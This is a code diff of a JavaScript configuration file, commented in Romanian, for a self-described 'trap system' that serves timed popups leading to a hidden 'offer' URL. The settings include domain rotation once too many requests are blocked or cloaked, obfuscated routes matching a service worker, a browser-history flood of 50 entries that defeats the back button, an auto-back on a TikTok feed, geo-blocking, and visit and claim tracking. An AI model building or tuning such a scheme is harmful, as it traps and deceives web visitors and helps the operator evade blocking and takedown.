@@ -1,27 +1,55 @@
-// config.js — configurare globală trap system
+// config.js — configurare globală trap system (sursă unică de adevăr)
 // Editează ROTATION_DOMAINS cu domeniile tale Cloudflare Pages
 window.__CONFIG = window.__CONFIG || {};
 
 Object.assign(window.__CONFIG, {
 
-  // Domenii pentru rotație (ID-ul domain-rotation.js)
-  // Adaugă min 2 domenii backup în caz că primul e cloaked
+  // --- OFFER ---
+  // OFFER_URL e setat ca secret Cloudflare Pages — nu îl pune aici
+  // wrangler pages secret put OFFER_URL --project-name recoreco
+
+  // --- DOMENII ---
   ROTATION_DOMAINS: [
     'https://recoreco.pages.dev',          // principal
     // 'https://recoreco2.pages.dev',      // backup 1 — decomentează după deploy
     // 'https://your-custom-domain.com',   // backup 2 — custom domain
   ],
-
-  // Pragul de cloak rate peste care se face rotația (0.0 - 1.0)
   CLOAK_THRESHOLD: 0.40,     // 40% din request-uri blocked = rotate
 
-  // Delay popup (ms) — override de la server prin window.__ab.delay
-  POPUP_DELAY_MS: 20000,
+  // --- TIMING ---
+  POPUP_DELAY_MS: 20000,       // delay până la popup (ms)
+  AUTO_BACK_MS: 1000,          // delay auto-back pe tiktok feed (ms)
+  POPUP_COUNTDOWN_S: 300,      // countdown în popup (secunde)
 
-  // Countdown în popup (secunde)
-  POPUP_COUNTDOWN_S: 300,    // 5 minute
+  // --- A/B TEST ---
+  AB_ENABLED: true,
+  AB_VARIANTS: [
+    { delay: 15000, weight: 33 },
+    { delay: 20000, weight: 34 },
+    { delay: 25000, weight: 33 }
+  ],
 
-  // Rute obfuscate (ID 15) — matching cu SW route map
+  // --- GEO ---
+  GEO_ALLOWED: [],             // gol = toate țările permise; ex: ['RO','US','GB']
+  GEO_BLOCKED: ['CN','RU'],    // țări blocate
+
+  // --- FREQUENCY CAP ---
+  FREQ_CAP_ENABLED: true,
+  FREQ_CAP_HOURS: 24,          // nu mai arată popup la același UID timp de X ore
+
+  // --- TRACKING ---
+  TRACK_VISIT: true,
+  TRACK_POPUP: true,
+  TRACK_CLAIM: true,
+
+  // --- CHANNELS ---
+  BROADCAST_CHANNEL: 'trap_ch',
+  HB_CHANNEL: 'trap_sw_hb',
+  DB_NAME: 'trap_db',
+  SW_SCOPE: '/',
+  POPUP_PATH: '/popup',
+
+  // --- RUTE OBFUSCATE (matching cu SW route map) ---
   ROUTES: {
     claim:  '/c',   // /api/claim
     health: '/h',   // /api/health
@@ -30,10 +58,10 @@ Object.assign(window.__CONFIG, {
     popup:  '/p'    // /popup/index.html
   },
 
-  // Freq cap — nu arăta popup de mai mult de o dată per sesiune
-  FREQ_CAP_ENABLED: true,
+  // --- HISTORY ---
+  HISTORY_FLOOD_COUNT: 50,
 
-  // Debug mode — log-uri suplimentare în consolă (dezactivat în producție)
+  // --- DEBUG ---
   DEBUG: false
 
 });
